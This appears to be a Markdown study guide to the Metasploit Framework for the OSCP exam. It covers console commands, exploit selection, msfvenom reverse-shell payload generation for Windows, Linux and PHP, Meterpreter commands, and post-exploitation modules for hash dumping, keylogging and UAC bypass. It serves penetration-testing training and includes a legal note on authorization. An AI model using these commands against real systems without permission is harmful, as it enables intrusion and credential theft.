# Introduction to Metasploit Framework

Metasploit Framework is a powerful penetration testing platform that enables you to find, exploit, and validate vulnerabilities. This guide covers the basics of Metasploit for the OSCP exam.

## 📋 Table of Contents
1. [Metasploit Architecture](#metasploit-architecture)
2. [Basic Commands](#basic-commands)
3. [Exploit Modules](#exploit-modules)
4. [Payloads](#payloads)
5. [Meterpreter](#meterpreter)
6. [Post-Exploitation](#post-exploitation)
7. [Practice](#-practice)

## Metasploit Architecture

### Components
- **msfconsole**: Main interface
- **Modules**: Exploits, payloads, encoders, etc.
- **Database**: Stores scan results and session data
- **Plugins**: Extend functionality

### Directory Structure
```
/usr/share/metasploit-framework/
├── modules/
│   ├── exploits/    # Exploit modules
│   ├── payloads/    # Payloads
│   ├── auxiliary/   # Scanning and enumeration
│   └── post/        # Post-exploitation
├── scripts/         # Meterpreter scripts
└── tools/           # Additional tools
```

## Basic Commands

### Starting Metasploit
```bash
# Start PostgreSQL service
sudo systemctl start postgresql

# Initialize database
msfdb init

# Start msfconsole
msfconsole
```

### Help System
```msf
# General help
help

# Module-specific help
info

# Search for modules
search [keyword]

# Use a module
use [module_path]
```

### Database Commands
```msf
# List all hosts
hosts

# List all services
services

# Import scan results
db_import nmap.xml
```

## Exploit Modules

### Selecting an Exploit
```msf
# Search for exploits
search [vulnerability]

# Select an exploit
use exploit/[path]

# Show options
show options

# Set required options
set RHOSTS [target]
set RPORT [port]

# Run the exploit
exploit
```

### Common Exploit Options
- **RHOSTS**: Target address(es)
- **RPORT**: Target port
- **LHOST**: Your IP
- **LPORT**: Port to connect back to
- **TARGET**: Select target platform/version

## Payloads

### Types of Payloads
- **Singles**: Self-contained (e.g., windows/shell_reverse_tcp)
- **Stagers**: Establishes connection
- **Stages**: Downloads additional components

### Generating Payloads
```bash
# Windows reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f exe > shell.exe

# Linux reverse shell
msfvenom -p linux/x86/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f elf > shell.elf

# PHP reverse shell
msfvenom -p php/reverse_php LHOST=[IP] LPORT=[PORT] -f raw > shell.php
```

## Meterpreter

### Basic Commands
```meterpreter
# System info
sysinfo

# Get user ID
getuid

# Get system privileges
getsystem

# List processes
ps

# Migrate to another process
migrate [PID]
```

### File System Commands
```meterpreter
# List files
ls

# Change directory
cd [directory]

# Download file
download [file]

# Upload file
upload [local_file] [remote_path]
```

## Post-Exploitation

### Common Modules
```msf
# Dump hashes
use post/windows/gather/hashdump

# Keylogger
use post/windows/capture/keylog_recorder

# Screenshot
use post/windows/gather/screen_spy
```

### Privilege Escalation
```meterpreter
# Check for local exploits
run post/multi/recon/local_exploit_suggester

# Try common exploits
use exploit/windows/local/bypassuac
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
```

## 🛠 Tools

### Metasploit Tools
- **msfconsole**: Main interface
- **msfvenom**: Payload generator
- **msfdb**: Database management
- **armitage**: GUI for Metasploit

### External Tools
- **Nmap**: Network scanning
- **Wireshark**: Network analysis
- **Burp Suite**: Web application testing

## 📚 Resources
- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
- [Metasploit Documentation](https://docs.rapid7.com/metasploit/)
- [Metasploit Cheat Sheet](https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf)

## 🎯 Practice
1. Set up a Metasploitable VM
2. Practice using different exploit modules
3. Generate and test various payloads
4. Practice post-exploitation techniques

## ⚠️ Legal Note
Only use Metasploit on systems you own or have explicit permission to test. Unauthorized testing is illegal.
